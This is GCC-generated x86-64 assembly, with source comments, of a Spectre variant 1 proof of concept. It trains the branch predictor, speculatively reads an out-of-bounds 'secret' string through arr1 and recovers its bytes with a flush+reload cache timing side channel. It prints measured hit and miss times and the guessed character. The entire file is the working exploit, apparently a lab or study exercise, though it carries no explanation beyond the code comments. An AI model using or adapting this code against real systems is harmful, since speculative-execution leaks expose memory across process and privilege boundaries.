	.file	"test.c"
# GNU C17 (Ubuntu 9.4.0-1ubuntu1~20.04.1) version 9.4.0 (x86_64-linux-gnu)
#	compiled by GNU C version 9.4.0, GMP version 6.2.0, MPFR version 4.0.2, MPC version 1.1.0, isl version isl-0.22.1-GMP

# GGC heuristics: --param ggc-min-expand=100 --param ggc-min-heapsize=131072
# options passed:  -imultiarch x86_64-linux-gnu test.c -mtune=generic
# -march=x86-64 -fverbose-asm -fasynchronous-unwind-tables
# -fstack-protector-strong -Wformat -Wformat-security
# -fstack-clash-protection -fcf-protection
# options enabled:  -fPIC -fPIE -faggressive-loop-optimizations
# -fassume-phsa -fasynchronous-unwind-tables -fauto-inc-dec -fcommon
# -fdelete-null-pointer-checks -fdwarf2-cfi-asm -fearly-inlining
# -feliminate-unused-debug-types -ffp-int-builtin-inexact -ffunction-cse
# -fgcse-lm -fgnu-runtime -fgnu-unique -fident -finline-atomics
# -fipa-stack-alignment -fira-hoist-pressure -fira-share-save-slots
# -fira-share-spill-slots -fivopts -fkeep-static-consts
# -fleading-underscore -flifetime-dse -flto-odr-type-merging -fmath-errno
# -fmerge-debug-strings -fpeephole -fplt -fprefetch-loop-arrays
# -freg-struct-return -fsched-critical-path-heuristic
# -fsched-dep-count-heuristic -fsched-group-heuristic -fsched-interblock
# -fsched-last-insn-heuristic -fsched-rank-heuristic -fsched-spec
# -fsched-spec-insn-heuristic -fsched-stalled-insns-dep -fschedule-fusion
# -fsemantic-interposition -fshow-column -fshrink-wrap-separate
# -fsigned-zeros -fsplit-ivs-in-unroller -fssa-backprop
# -fstack-clash-protection -fstack-protector-strong -fstdarg-opt
# -fstrict-volatile-bitfields -fsync-libcalls -ftrapping-math -ftree-cselim
# -ftree-forwprop -ftree-loop-if-convert -ftree-loop-im -ftree-loop-ivcanon
# -ftree-loop-optimize -ftree-parallelize-loops= -ftree-phiprop
# -ftree-reassoc -ftree-scev-cprop -funit-at-a-time -funwind-tables
# -fverbose-asm -fzero-initialized-in-bss -m128bit-long-double -m64 -m80387
# -malign-stringops -mavx256-split-unaligned-load
# -mavx256-split-unaligned-store -mfancy-math-387 -mfp-ret-in-387 -mfxsr
# -mglibc -mieee-fp -mlong-double-80 -mmmx -mno-sse4 -mpush-args -mred-zone
# -msse -msse2 -mstv -mtls-direct-seg-refs -mvzeroupper

	.text
	.globl	arr1_size
	.data
	.align 4
	.type	arr1_size, @object
	.size	arr1_size, 4
arr1_size:
	.long	16
	.globl	arr1
	.align 16
	.type	arr1, @object
	.size	arr1, 16
arr1:
	.ascii	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.comm	arr2,131072,32
	.globl	secret
	.section	.rodata
.LC0:
	.string	"This is the sensitive data"
	.section	.data.rel.local,"aw"
	.align 8
	.type	secret, @object
	.size	secret, 8
secret:
	.quad	.LC0
	.text
	.type	Load, @function
Load:
.LFB4262:
	.cfi_startproc
	pushq	%rbp	#
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp	#,
	.cfi_def_cfa_register 6
	movq	%rdi, -24(%rbp)	# addr, addr
# test.c:18:     asm __volatile__(
	movq	-24(%rbp), %rax	# addr, tmp85
	movq	%rax, %rcx	# tmp85, tmp85
#APP
# 18 "test.c" 1
	 movl (%rcx), %eax 	# tmp85

# 0 "" 2
#NO_APP
	movl	%eax, -4(%rbp)	# tmp84, val
# test.c:24:     return (val);
	movl	-4(%rbp), %eax	# val, _4
# test.c:25: }
	popq	%rbp	#
	.cfi_def_cfa 7, 8
	ret	
	.cfi_endproc
.LFE4262:
	.size	Load, .-Load
	.type	LoadAndMeasure, @function
LoadAndMeasure:
.LFB4263:
	.cfi_startproc
	pushq	%rbp	#
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp	#,
	.cfi_def_cfa_register 6
	movq	%rdi, -24(%rbp)	# addr, addr
# test.c:30:     asm __volatile__(
	movq	-24(%rbp), %rax	# addr, tmp85
	movq	%rax, %rcx	# tmp85, tmp85
#APP
# 30 "test.c" 1
	 mfence 
 rdtsc 
 lfence 
 movl %eax, %esi 
 movl (%rcx), %eax 	# tmp85
 lfence 
 rdtsc 
 subl %esi, %eax
# 0 "" 2
#NO_APP
	movl	%eax, -4(%rbp)	# tmp84, val
# test.c:43:     return (val);
	movl	-4(%rbp), %eax	# val, _4
# test.c:45: }
	popq	%rbp	#
	.cfi_def_cfa 7, 8
	ret	
	.cfi_endproc
.LFE4263:
	.size	LoadAndMeasure, .-LoadAndMeasure
	.section	.rodata
	.align 8
.LC1:
	.string	"hit time in this machine is %d\n"
	.align 8
.LC2:
	.string	"misstime in this machine is %d\n"
.LC3:
	.string	"result mix i is %d   \n"
	.align 8
.LC4:
	.string	"guessed ASCII decimal is %d, corresponding char is %c, cache hit time is %d over total 1 times\n"
	.text
	.globl	main
	.type	main, @function
main:
.LFB4264:
	.cfi_startproc
	endbr64	
	pushq	%rbp	#
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp	#,
	.cfi_def_cfa_register 6
	addq	$-128, %rsp	#,
	movl	%edi, -116(%rbp)	# argc, argc
	movq	%rsi, -128(%rbp)	# argv, argv
# test.c:51:   size_t malicious_index = (size_t) (secret - (char*)arr1 ); // the malicious index is the first character in secret (which is T)
	movq	secret(%rip), %rax	# secret, secret.0_1
	leaq	arr1(%rip), %rdx	#, tmp119
	subq	%rdx, %rax	# tmp119, _2
# test.c:51:   size_t malicious_index = (size_t) (secret - (char*)arr1 ); // the malicious index is the first character in secret (which is T)
	movq	%rax, -56(%rbp)	# _2, malicious_index
# test.c:53:   for (int j = 0 ; j  < 256*512; ++j) arr2[j] = 1; // write data into arr2 so that no copy on write zero page on RAM
	movl	$0, -100(%rbp)	#, j
# test.c:53:   for (int j = 0 ; j  < 256*512; ++j) arr2[j] = 1; // write data into arr2 so that no copy on write zero page on RAM
	jmp	.L6	#
.L7:
# test.c:53:   for (int j = 0 ; j  < 256*512; ++j) arr2[j] = 1; // write data into arr2 so that no copy on write zero page on RAM
	movl	-100(%rbp), %eax	# j, tmp121
	cltq
	leaq	arr2(%rip), %rdx	#, tmp122
	movb	$1, (%rax,%rdx)	#, arr2
# test.c:53:   for (int j = 0 ; j  < 256*512; ++j) arr2[j] = 1; // write data into arr2 so that no copy on write zero page on RAM
	addl	$1, -100(%rbp)	#, j
.L6:
# test.c:53:   for (int j = 0 ; j  < 256*512; ++j) arr2[j] = 1; // write data into arr2 so that no copy on write zero page on RAM
	cmpl	$131071, -100(%rbp)	#, j
	jle	.L7	#,
# test.c:55:   int hit_time = LoadAndMeasure(&arr2[256*512]); // the last data should in the cache 
	leaq	131072+arr2(%rip), %rdi	#,
	call	LoadAndMeasure	#
# test.c:55:   int hit_time = LoadAndMeasure(&arr2[256*512]); // the last data should in the cache 
	movl	%eax, -80(%rbp)	# _3, hit_time
# test.c:56:   printf("hit time in this machine is %d\n", hit_time);
	movl	-80(%rbp), %eax	# hit_time, tmp123
	movl	%eax, %esi	# tmp123,
	leaq	.LC1(%rip), %rdi	#,
	movl	$0, %eax	#,
	call	printf@PLT	#
	leaq	131072+arr2(%rip), %rax	#, tmp124
	movq	%rax, -24(%rbp)	# tmp124, __A
# /usr/lib/gcc/x86_64-linux-gnu/9/include/emmintrin.h:1498:   __builtin_ia32_clflush (__A);
	movq	-24(%rbp), %rax	# __A, tmp125
	clflush	(%rax)	# tmp125
# /usr/lib/gcc/x86_64-linux-gnu/9/include/emmintrin.h:1499: }
	nop	
# test.c:59:   int miss_time = LoadAndMeasure(&arr2[256*512]);
	leaq	131072+arr2(%rip), %rdi	#,
	call	LoadAndMeasure	#
# test.c:59:   int miss_time = LoadAndMeasure(&arr2[256*512]);
	movl	%eax, -76(%rbp)	# _4, miss_time
# test.c:60:   printf("misstime in this machine is %d\n", miss_time);
	movl	-76(%rbp), %eax	# miss_time, tmp126
	movl	%eax, %esi	# tmp126,
	leaq	.LC2(%rip), %rdi	#,
	movl	$0, %eax	#,
	call	printf@PLT	#
# test.c:62:   __sync_synchronize();
	mfence	
# test.c:66:   int mix_i = 0;
	movl	$0, -72(%rbp)	#, mix_i
# test.c:70:   int threshold = hit_time + 20;
	movl	-80(%rbp), %eax	# hit_time, tmp130
	addl	$20, %eax	#, tmp129
	movl	%eax, -68(%rbp)	# tmp129, threshold
# test.c:71:   int non = 0;
	movl	$0, -64(%rbp)	#, non
# test.c:76:     for (int i = 0; i < 256; i++){
	movl	$0, -96(%rbp)	#, i
# test.c:76:     for (int i = 0; i < 256; i++){
	jmp	.L8	#
.L9:
# test.c:77:       _mm_clflush(&arr2[i * 512]); // flush all the cache line 
	movl	-96(%rbp), %eax	# i, tmp131
	sall	$9, %eax	#, _5
# test.c:77:       _mm_clflush(&arr2[i * 512]); // flush all the cache line 
	cltq
	leaq	arr2(%rip), %rdx	#, tmp133
	addq	%rdx, %rax	# tmp133, _6
	movq	%rax, -16(%rbp)	# _6, __A
# /usr/lib/gcc/x86_64-linux-gnu/9/include/emmintrin.h:1498:   __builtin_ia32_clflush (__A);
	movq	-16(%rbp), %rax	# __A, tmp134
	clflush	(%rax)	# tmp134
# /usr/lib/gcc/x86_64-linux-gnu/9/include/emmintrin.h:1499: }
	nop	
# test.c:78:       asm __volatile__(" mfence \n");
#APP
# 78 "test.c" 1
	 mfence 

# 0 "" 2
# test.c:76:     for (int i = 0; i < 256; i++){
#NO_APP
	addl	$1, -96(%rbp)	#, i
.L8:
# test.c:76:     for (int i = 0; i < 256; i++){
	cmpl	$255, -96(%rbp)	#, i
	jle	.L9	#,
# test.c:81:     training_x = 50 % arr1_size;
	movl	arr1_size(%rip), %ecx	# arr1_size, arr1_size.1_7
	movl	$50, %eax	#, tmp135
	movl	$0, %edx	#, tmp136
	divl	%ecx	# arr1_size.1_7
	movl	%edx, %eax	# tmp136, _8
# test.c:81:     training_x = 50 % arr1_size;
	movl	%eax, %eax	# _8, tmp188
	movq	%rax, -48(%rbp)	# tmp188, training_x
# test.c:83:     for ( int t = 29;  t >= 0; t--) {
	movl	$29, -92(%rbp)	#, t
# test.c:83:     for ( int t = 29;  t >= 0; t--) {
	jmp	.L10	#
.L14:
	leaq	arr1_size(%rip), %rax	#, tmp138
	movq	%rax, -8(%rbp)	# tmp138, __A
# /usr/lib/gcc/x86_64-linux-gnu/9/include/emmintrin.h:1498:   __builtin_ia32_clflush (__A);
	movq	-8(%rbp), %rax	# __A, tmp139
	clflush	(%rax)	# tmp139
# /usr/lib/gcc/x86_64-linux-gnu/9/include/emmintrin.h:1499: }
	nop	
# test.c:85:       asm __volatile__(" mfence \n");
#APP
# 85 "test.c" 1
	 mfence 

# 0 "" 2
# test.c:87:       for (volatile int z = 0; z < 100; z++) {} // delay
#NO_APP
	movl	$0, -104(%rbp)	#, z
# test.c:87:       for (volatile int z = 0; z < 100; z++) {} // delay
	jmp	.L11	#
.L12:
# test.c:87:       for (volatile int z = 0; z < 100; z++) {} // delay
	movl	-104(%rbp), %eax	# z, z.2_9
	addl	$1, %eax	#, _10
	movl	%eax, -104(%rbp)	# _10, z
.L11:
# test.c:87:       for (volatile int z = 0; z < 100; z++) {} // delay
	movl	-104(%rbp), %eax	# z, z.3_11
# test.c:87:       for (volatile int z = 0; z < 100; z++) {} // delay
	cmpl	$99, %eax	#, z.3_11
	jle	.L12	#,
# test.c:89:       x = ((t % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
	movl	-92(%rbp), %ecx	# t, tmp140
	movslq	%ecx, %rax	# tmp140, tmp141
	imulq	$715827883, %rax, %rax	#, tmp141, tmp142
	shrq	$32, %rax	#, tmp142
	movq	%rax, %rdx	# tmp142, tmp143
	movl	%ecx, %eax	# tmp140, tmp144
	sarl	$31, %eax	#, tmp144
	subl	%eax, %edx	# tmp144, _12
	movl	%edx, %eax	# _12, tmp145
	addl	%eax, %eax	# tmp145
	addl	%edx, %eax	# _12, tmp145
	addl	%eax, %eax	# tmp146
	subl	%eax, %ecx	# tmp145, tmp140
	movl	%ecx, %edx	# tmp140, _12
# test.c:89:       x = ((t % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
	leal	-1(%rdx), %eax	#, _13
# test.c:89:       x = ((t % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
	movw	$0, %ax	#, _14
# test.c:89:       x = ((t % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
	cltq
	movq	%rax, -32(%rbp)	# tmp147, x
# test.c:90:       x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
	movq	-32(%rbp), %rax	# x, tmp148
	shrq	$16, %rax	#, _15
# test.c:90:       x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
	orq	%rax, -32(%rbp)	# _15, x
# test.c:91:       x = training_x ^ (x & (malicious_index ^ training_x)); // x = tranning_x for normal behaviour when previous x = 0, x = malicious_index when previous x = -1 
	movq	-56(%rbp), %rax	# malicious_index, tmp149
	xorq	-48(%rbp), %rax	# training_x, _16
# test.c:91:       x = training_x ^ (x & (malicious_index ^ training_x)); // x = tranning_x for normal behaviour when previous x = 0, x = malicious_index when previous x = -1 
	andq	-32(%rbp), %rax	# x, _17
# test.c:91:       x = training_x ^ (x & (malicious_index ^ training_x)); // x = tranning_x for normal behaviour when previous x = 0, x = malicious_index when previous x = -1 
	xorq	-48(%rbp), %rax	# training_x, tmp151
	movq	%rax, -32(%rbp)	# tmp151, x
# test.c:94:       if (x < arr1_size){
	movl	arr1_size(%rip), %eax	# arr1_size, arr1_size.4_18
	movl	%eax, %eax	# arr1_size.4_18, _19
# test.c:94:       if (x < arr1_size){
	cmpq	%rax, -32(%rbp)	# _19, x
	jnb	.L13	#,
# test.c:95:         asm __volatile__(" nop \n  nop \n  nop \n  nop \n  nop \n");
#APP
# 95 "test.c" 1
	 nop 
  nop 
  nop 
  nop 
  nop 

# 0 "" 2
# test.c:96:         Load(&arr2[arr1[x] * 512]);
#NO_APP
	leaq	arr1(%rip), %rdx	#, tmp153
	movq	-32(%rbp), %rax	# x, tmp154
	addq	%rdx, %rax	# tmp153, tmp152
	movzbl	(%rax), %eax	# arr1, _20
	movzbl	%al, %eax	# _20, _21
# test.c:96:         Load(&arr2[arr1[x] * 512]);
	sall	$9, %eax	#, _22
# test.c:96:         Load(&arr2[arr1[x] * 512]);
	cltq
	leaq	arr2(%rip), %rdx	#, tmp156
	addq	%rdx, %rax	# tmp156, _23
	movq	%rax, %rdi	# _23,
	call	Load	#
.L13:
# test.c:83:     for ( int t = 29;  t >= 0; t--) {
	subl	$1, -92(%rbp)	#, t
.L10:
# test.c:83:     for ( int t = 29;  t >= 0; t--) {
	cmpl	$0, -92(%rbp)	#, t
	jns	.L14	#,
# test.c:107:     for (int i = 0; i < 256; i++){
	movl	$0, -88(%rbp)	#, i
# test.c:107:     for (int i = 0; i < 256; i++){
	jmp	.L15	#
.L17:
# test.c:108:       mix_i = ((i * 167) + 13) & 255; 
	movl	-88(%rbp), %eax	# i, tmp157
	imull	$167, %eax, %eax	#, tmp157, _24
# test.c:108:       mix_i = ((i * 167) + 13) & 255; 
	addl	$13, %eax	#, _25
# test.c:108:       mix_i = ((i * 167) + 13) & 255; 
	andl	$255, %eax	#, tmp158
	movl	%eax, -72(%rbp)	# tmp158, mix_i
# test.c:109:       addr = & arr2[mix_i * 512];
	movl	-72(%rbp), %eax	# mix_i, tmp159
	sall	$9, %eax	#, _26
# test.c:109:       addr = & arr2[mix_i * 512];
	cltq
	leaq	arr2(%rip), %rdx	#, tmp161
	addq	%rdx, %rax	# tmp161, tmp162
	movq	%rax, -40(%rbp)	# tmp162, addr
# test.c:110:       measured_time = LoadAndMeasure(addr);
	movq	-40(%rbp), %rax	# addr, tmp163
	movq	%rax, %rdi	# tmp163,
	call	LoadAndMeasure	#
# test.c:110:       measured_time = LoadAndMeasure(addr);
	movl	%eax, -60(%rbp)	# _27, measured_time
# test.c:112:       if (measured_time <= threshold && mix_i != arr1[training_x]){ // arr1[training_x] will also loaded in cache for fool predictor
	movl	-60(%rbp), %eax	# measured_time, tmp164
	cmpl	-68(%rbp), %eax	# threshold, tmp164
	jg	.L16	#,
# test.c:112:       if (measured_time <= threshold && mix_i != arr1[training_x]){ // arr1[training_x] will also loaded in cache for fool predictor
	leaq	arr1(%rip), %rdx	#, tmp166
	movq	-48(%rbp), %rax	# training_x, tmp167
	addq	%rdx, %rax	# tmp166, tmp165
	movzbl	(%rax), %eax	# arr1, _28
	movzbl	%al, %eax	# _28, _29
# test.c:112:       if (measured_time <= threshold && mix_i != arr1[training_x]){ // arr1[training_x] will also loaded in cache for fool predictor
	cmpl	%eax, -72(%rbp)	# _29, mix_i
	je	.L16	#,
# test.c:113:         results[mix_i]++; // hit one time
	movl	-72(%rbp), %eax	# mix_i, tmp169
	cltq
	leaq	0(,%rax,4), %rdx	#, tmp170
	leaq	results.26241(%rip), %rax	#, tmp171
	movl	(%rdx,%rax), %eax	# results, _30
# test.c:113:         results[mix_i]++; // hit one time
	leal	1(%rax), %ecx	#, _31
	movl	-72(%rbp), %eax	# mix_i, tmp173
	cltq
	leaq	0(,%rax,4), %rdx	#, tmp174
	leaq	results.26241(%rip), %rax	#, tmp175
	movl	%ecx, (%rdx,%rax)	# _31, results
# test.c:114:         printf("result mix i is %d   \n",mix_i);
	movl	-72(%rbp), %eax	# mix_i, tmp176
	movl	%eax, %esi	# tmp176,
	leaq	.LC3(%rip), %rdi	#,
	movl	$0, %eax	#,
	call	printf@PLT	#
.L16:
# test.c:107:     for (int i = 0; i < 256; i++){
	addl	$1, -88(%rbp)	#, i
.L15:
# test.c:107:     for (int i = 0; i < 256; i++){
	cmpl	$255, -88(%rbp)	#, i
	jle	.L17	#,
# test.c:123:   for (int m = 0; m < 255; m++){
	movl	$0, -84(%rbp)	#, m
# test.c:123:   for (int m = 0; m < 255; m++){
	jmp	.L18	#
.L20:
# test.c:124:     if (results[m] != 0){
	movl	-84(%rbp), %eax	# m, tmp178
	cltq
	leaq	0(,%rax,4), %rdx	#, tmp179
	leaq	results.26241(%rip), %rax	#, tmp180
	movl	(%rdx,%rax), %eax	# results, _32
# test.c:124:     if (results[m] != 0){
	testl	%eax, %eax	# _32
	je	.L19	#,
# test.c:125:       printf("guessed ASCII decimal is %d, corresponding char is %c, cache hit time is %d over total 1 times\n", m, (uint8_t)m , results[m] );
	movl	-84(%rbp), %eax	# m, tmp182
	cltq
	leaq	0(,%rax,4), %rdx	#, tmp183
	leaq	results.26241(%rip), %rax	#, tmp184
	movl	(%rdx,%rax), %ecx	# results, _33
# test.c:125:       printf("guessed ASCII decimal is %d, corresponding char is %c, cache hit time is %d over total 1 times\n", m, (uint8_t)m , results[m] );
	movl	-84(%rbp), %eax	# m, tmp185
# test.c:125:       printf("guessed ASCII decimal is %d, corresponding char is %c, cache hit time is %d over total 1 times\n", m, (uint8_t)m , results[m] );
	movzbl	%al, %edx	# _34, _35
	movl	-84(%rbp), %eax	# m, tmp186
	movl	%eax, %esi	# tmp186,
	leaq	.LC4(%rip), %rdi	#,
	movl	$0, %eax	#,
	call	printf@PLT	#
.L19:
# test.c:123:   for (int m = 0; m < 255; m++){
	addl	$1, -84(%rbp)	#, m
.L18:
# test.c:123:   for (int m = 0; m < 255; m++){
	cmpl	$254, -84(%rbp)	#, m
	jle	.L20	#,
# test.c:129:   return 0;
	movl	$0, %eax	#, _68
# test.c:131: }
	leave	
	.cfi_def_cfa 7, 8
	ret	
	.cfi_endproc
.LFE4264:
	.size	main, .-main
	.local	results.26241
	.comm	results.26241,1024,32
	.ident	"GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0"
	.section	.note.GNU-stack,"",@progbits
	.section	.note.gnu.property,"a"
	.align 8
	.long	 1f - 0f
	.long	 4f - 1f
	.long	 5
0:
	.string	 "GNU"
1:
	.align 8
	.long	 0xc0000002
	.long	 3f - 2f
2:
	.long	 0x3
3:
	.align 8
4:
